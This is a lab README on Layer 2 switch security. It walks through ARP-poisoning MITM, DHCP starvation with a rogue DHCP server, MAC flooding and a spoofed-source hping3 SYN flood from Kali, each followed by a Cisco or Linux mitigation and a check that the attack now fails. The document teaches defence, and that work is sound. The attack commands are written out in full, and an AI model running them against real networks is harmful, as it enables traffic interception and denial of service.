<div align="center">

# 🛡️ Layer 2 Attack & Defense Lab

### Break It, Then Secure It — Switch Security with Kali & Cisco

`ARP Poisoning` · `MITM` · `DHCP Attacks` · `MAC Flooding` · `SYN Flood (DoS)` · `DAI` · `DHCP Snooping` · `Port Security`

![Kali](https://img.shields.io/badge/Kali_Linux-557C94?style=for-the-badge&logo=kalilinux&logoColor=white)
![Cisco](https://img.shields.io/badge/Cisco-1BA0D7?style=for-the-badge&logo=cisco&logoColor=white)
![Wireshark](https://img.shields.io/badge/Wireshark-1679A7?style=for-the-badge&logo=wireshark&logoColor=white)
![Status](https://img.shields.io/badge/Status-Working-success?style=for-the-badge)

*Every attack here works — until the right Layer 2 defense shuts it down.*

</div>

---

## 🎯 The Concept

This lab runs the full **offensive → defensive** loop that real security work is built on:

1. **Attack** — launch a classic Layer 2 attack from Kali and prove it works
2. **Understand** — explain *why* the attack succeeds (the protocol weakness)
3. **Defend** — apply the matching Cisco mitigation
4. **Verify** — re-run the attack and watch it **fail**

That before/after — attack works, defense applied, attack blocked — is the story that proves you don't just memorize security features, you understand what they actually stop.

---

## 🗺️ Topology

```
        [ Kali ]                          [ VPC1 ]
      (attacker)                         (victim)
          │ vmnet1                          │ e0/1
          │                                 │
      [ Network ]──────[ SW1 ]──────────────┤
        (cloud)      e0/0    e0/2           │
                              │             │
                       vmnet1 │          [ VPC3 ]
                              │          (victim)
                        [ Windows ]
                         (victim)

  All hosts in the SAME subnet (vmnet1) — the perfect
  Layer 2 attack surface. SW1 is the Cisco switch we defend.
```

|Host|Role|Connection|
|-|-|-|
|Kali|Attacker|vmnet1|
|VPC2|Victim|SW e0/2|
|VPC1|Victim|SW1 e0/1|
|VPC3|Victim|SW1 e1/0|
|SW1|The switch we attack & defend|—|

> All devices share one subnet — exactly the flat Layer 2 segment these attacks exploit.

---

## ⚔️ Attack & Defense Map

|#|Attack|Tool|Impact|Cisco Defense|
|-|-|-|-|-|
|1|ARP Poisoning / MITM|Ettercap / arpspoof|Intercept traffic between hosts|Dynamic ARP Inspection (DAI)|
|2|DHCP Starvation + Rogue DHCP|Yersinia|Drain pool, become fake gateway|DHCP Snooping|
|3|MAC Flooding|macof|Switch floods all traffic (sniff everything)|Port Security|
|4|SYN Flood (DoS)|hping3|Exhaust connection table, take service down|SYN cookies + rate limiting|

---

## ⚙️ Lab Setup — Addressing & DHCP

Everything lives on **192.168.81.0/24 (VMnet1)**. **VMnet1's built-in DHCP** is the server; Kali sits on the same subnet, so the attacks hit the wire directly.

|Host|IP|Role|
|-|-|-|
|VMnet1 DHCP (cloud)|192.168.81.x|The DHCP server|
|Kali|192.168.81.x|Attacker|
|DHCP server|DHCP pool|server|
|VPC1 / VPC3 /VPC2|192.168.81.x (via DHCP)|Victims|
|SW1|—|The switch we attack & defend|

> **DHCP path:** `VMnet1 DHCP (cloud) → SW1 → VPCs`. The DHCP traffic **crosses SW1**, so DHCP snooping on SW1 can protect it. The **cloud-facing port on SW1 = trusted** (that's where the real DHCP lives); VPC/Kali ports stay untrusted.

> **Tip for the starvation demo:** VMnet1's pool is large, so the flood may take a while to drain it. To make the "pool empty" proof fast and obvious, **shrink the VMnet1 DHCP scope** in VMware's Virtual Network Editor (VMnet1 → DHCP Settings → set a small range, e.g. `.50`–`.70`). A small pool empties in seconds and the screenshot is clear.

---

## 🔴 ATTACK 1 — ARP Poisoning (Man-in-the-Middle)

### The Attack

```bash
# Enable IP forwarding so traffic still flows (stealthy MITM)
echo 1 > /proc/sys/net/ipv4/ip_forward

# Ettercap — poison between victim and gateway
ettercap -T -i eth0 -M arp:remote /VICTIM_IP// /GATEWAY_IP//

# Or with arpspoof
arpspoof -i eth0 -t VICTIM_IP GATEWAY_IP
```

### Proof It Worked

```bash
# On the VICTIM — its ARP table now shows KALI's MAC
# for the gateway IP (you've inserted yourself)
arp -a

# On Kali — capture the intercepted traffic
wireshark   # filter: ip.addr == VICTIM_IP  📸  ← the money shot
```

### Why It Works

> ARP has **no authentication**. Any host can claim to own any IP, and switches forward the lie. The victim caches Kali's MAC for the gateway, so all its traffic flows through Kali first.

### 🛡️ The Defense — Dynamic ARP Inspection (DAI)

```cisco
! DAI relies on the DHCP snooping binding table
ip dhcp snooping
ip dhcp snooping vlan 1

! Inspect ARP on the victim VLAN
ip arp inspection vlan 1

! Trust the uplink (where the real gateway/DHCP lives)
interface Ethernet0/0
 ip arp inspection trust
```

### Verify the Fix

```cisco
SW1# show ip arp inspection statistics    → dropped ARP counts rising
SW1# show ip arp inspection vlan 1         → enabled, active
```

```bash
# Re-run the attack from Kali → DAI drops the forged ARP
# Victim's ARP table stays correct → MITM FAILS ✅  📸
```

---

## 🔴 ATTACK 2 — DHCP Starvation + Rogue DHCP

### The Attack

```bash
# --- Starvation: flood the server until the pool is empty ---

# Option A — dhcpstarv (most reliable)
sudo apt install dhcpstarv -y
sudo dhcpstarv -i eth0

# Option B — yersinia interactive (GUI often missing; use -I)
sudo yersinia -I            # press F2 (DHCP) → x → "sending DISCOVER packet"

# Option C — yersinia one-liner
sudo yersinia dhcp -attack 1 -interface eth0
```

```bash
# --- Rogue DHCP: after draining the real pool, BE the server ---
sudo apt install dnsmasq -y
sudo dnsmasq -d -p0 --dhcp-range=192.168.81.50,192.168.81.150,12h \
  --dhcp-option=3,192.168.81.KALI \      # option 3 = gateway = Kali
  --dhcp-option=6,192.168.81.KALI \      # option 6 = DNS = Kali
  -i eth0
```

### Proof It Worked

```bash
# A real VPC can no longer pull an IP (pool drained) 📸
#   on VPC1: release/renew → fails
# New clients get KALI as their gateway → MITM at scale  📸
#   on a victim: check the gateway → it's Kali's IP
```

> Since VMnet1 is the DHCP server, watch the proof on the **victims** (no
> address / Kali as gateway) rather than on a Cisco `show ip dhcp` table.

### Why It Works

> DHCP trusts **any** server that answers first. Flood the real server until its pool is empty, then race to reply — clients accept Kali's offer and use Kali as the gateway.

### 🛡️ The Defense — DHCP Snooping

```cisco
ip dhcp snooping
ip dhcp snooping vlan 1

! Only the uplink toward the REAL DHCP server is trusted
interface Ethernet0/0
 ip dhcp snooping trust

! Rate-limit DHCP on access ports (stops starvation flood)
interface range Ethernet0/1 - 2
 ip dhcp snooping limit rate 10
```

### Verify the Fix

```cisco
SW1# show ip dhcp snooping              → enabled, trusted port listed
SW1# show ip dhcp snooping binding      → legit IP↔MAC bindings only
```

```bash
# Rogue DHCP offers from Kali (untrusted port) are DROPPED ✅
# Starvation flood is rate-limited → attack FAILS  📸
```

---

## 🔴 ATTACK 3 — MAC Flooding (CAM Table Overflow)

### The Attack

```bash
# Flood the switch with thousands of fake source MACs
macof -i eth0

# The CAM table fills, the switch "fails open" and floods
# ALL frames out every port → Kali sniffs everyone's traffic
```

### Proof It Worked

```bash
# Before flooding: switch forwards only to the right port
# After flooding: Kali sees traffic destined for OTHER hosts
wireshark   # you now see VPC1↔VPC3 traffic you shouldn't  📸
```

### Why It Works

> A switch's CAM table is **finite**. Overflow it and the switch can't learn where MACs live, so it floods every frame out all ports — turning the switch into a hub and letting you sniff everything.

### 🛡️ The Defense — Port Security

```cisco
interface range Ethernet0/1 - 2
 switchport mode access
 switchport port-security
 switchport port-security maximum 2
 switchport port-security violation restrict
 switchport port-security mac-address sticky
```

### Verify the Fix

```cisco
SW1# show port-security                 → secured ports, violation counts
SW1# show port-security address         → learned sticky MACs
```

```bash
# macof floods → port-security caps MACs per port →
# extra MACs dropped, port can err-disable → flooding FAILS ✅  📸
```

---

## 🔴 ATTACK 4 — SYN Flood (Denial of Service)

### The Attack

**Scenario:** a victim host (VPC1) is doing normal work — a continuous ping to another host. While it's busy, we bury it under a massive SYN flood. The host has to deal with thousands of half-open connection attempts on top of its normal traffic, its resources get exhausted, and it can no longer keep up — the ping stalls and the host goes unresponsive.

```bash
# Flood the VICTIM HOST itself with SYNs (resource exhaustion)
sudo hping3 -S --flood -V -p 80 --rand-source VICTIM_IP

#  -S            send SYN packets (fake connection attempts)
#  --flood       send as fast as possible (no reply wait)
#  -p 80         target port on the victim
#  --rand-source spoof random source IPs (each looks like a new client)

# Variants
sudo hping3 -S --flood -p 80 VICTIM_IP                       # single-source flood
sudo hping3 -S --flood -p 80 --rand-source -d 120 VICTIM_IP  # bigger packets
```

> ⚠️ **Match the target.** Flood the **same host** you're watching. (Tip: `-1` is ICMP/ping flood; `-S` is the SYN flood used here.)

### Proof It Worked

```bash
# BEFORE: the victim is pinging normally — fast, steady replies  📸
# DURING the flood: the victim is overwhelmed handling fake SYNs
#   → its ongoing ping stalls / drops
#   → the host becomes slow or unresponsive (DoS)  📸

# On the victim (if it has a real TCP stack):
#   (Linux)   netstat -tn | grep SYN_RECV | wc -l   → climbing fast
#   (Windows) netstat -n -p tcp | find "SYN_RECEIVED"

# On Kali / Wireshark: a wall of SYN packets, no completed handshakes  📸

```

### Why It Works

> Every TCP connection starts with a 3-way handshake (SYN → SYN-ACK → ACK). The attacker sends floods of **SYN** packets but never completes the handshake. The victim holds each half-open connection in memory, waiting — until its connection table is full and it can't accept **real** clients. Spoofed source IPs make it worse and hide the attacker.

### 🛡️ The Defense — Rate Limiting + TCP Hardening

**On the host / server (Linux victim):**

```bash
# Enable SYN cookies — lets the server survive a SYN flood
sudo sysctl -w net.ipv4.tcp_syncookies=1

# Shrink the backlog hold time and reduce retries
sudo sysctl -w net.ipv4.tcp_max_syn_backlog=2048
sudo sysctl -w net.ipv4.tcp_synack_retries=2
```

**On the Cisco switch/router — rate-limit / policing (CoPP-style):**

```cisco
! Police inbound SYN-heavy traffic toward the server
ip access-list extended SYN-RATE
 permit tcp any host TARGET_IP

class-map match-all SYN-CLASS
 match access-group name SYN-RATE
policy-map SYN-LIMIT
 class SYN-CLASS
  police 1000000 conform-action transmit exceed-action drop

interface Ethernet0/1
 service-policy input SYN-LIMIT
```

> In a switched lab, the host-side `tcp_syncookies` is the cleanest, most reliable mitigation to demo. The Cisco policer shows the network-layer control.

### Verify the Fix

```bash
# With SYN cookies on, the server keeps answering real clients
#   during the flood → web page still loads  📸
cat /proc/sys/net/ipv4/tcp_syncookies     # → 1

# Watch the kernel log note SYN cookies kicking in:
dmesg | grep -i "syn"                       # "possible SYN flooding"
```

```cisco
SW1# show policy-map interface Ethernet0/1   → exceed/drop counters rising
```

---

## 🧰 The Complete Hardened Switch Config

```cisco
hostname SW1

! ===== DHCP Snooping (feeds DAI) =====
ip dhcp snooping
ip dhcp snooping vlan 1
no ip dhcp snooping information option

! ===== Dynamic ARP Inspection =====
ip arp inspection vlan 1

! ===== Uplink = trusted (real gateway/DHCP) =====
interface Ethernet0/0
 description UPLINK-TRUSTED
 switchport mode access
 ip dhcp snooping trust
 ip arp inspection trust

! ===== Access ports = locked down =====
interface range Ethernet0/1 - 2
 switchport mode access
 switchport nonegotiate
 switchport port-security
 switchport port-security maximum 2
 switchport port-security violation restrict
 switchport port-security mac-address sticky
 ip dhcp snooping limit rate 10
 no cdp enable
 spanning-tree portfast
 spanning-tree bpduguard enable
```

---

## ✅ Verification & Screenshots

|#|Attack works (before)|Defense applied|Attack fails (after)|
|-|-|-|-|
|1|Victim ARP shows Kali MAC 📸|DAI|Forged ARP dropped 📸|
|2|Clients get Kali gateway 📸|DHCP Snooping|Rogue offers dropped 📸|
|3|Kali sniffs others' traffic 📸|Port Security|MACs capped, flood stops 📸|
|4|Service down, SYN_RECV climbing 📸|SYN cookies + policing|Service stays up under flood 📸|

> The **before/after pairs** are the proof. Capture each attack succeeding, then the same attack blocked after the fix.

---

## 🧠 What This Lab Demonstrates

```
✅ Offensive attacks (Kali: ettercap, dhcpstarv, macof, hping3)
✅ Traffic interception proof (Wireshark)
✅ The matching Cisco mitigations (DAI, snooping, port-sec)
✅ Attack → defense → verify methodology
✅ Detection commands (show ... statistics / binding)
✅ Both sides of security: red AND blue
```

---

<div align="center">

## 🏆 Why This Lab Matters

|Skill|Demonstrated|
|-|-|
|**Offensive**|ARP/MITM, DHCP attacks, MAC flooding, SYN flood DoS|
|**Tooling**|Kali, Ettercap, Yersinia, macof, Wireshark|
|**Defensive**|DAI, DHCP Snooping, Port Security, SYN cookies + policing|
|**Methodology**|Attack → understand → defend → verify|

**Knowing the defense is good. Proving it stops a real attack is better.**

</div>

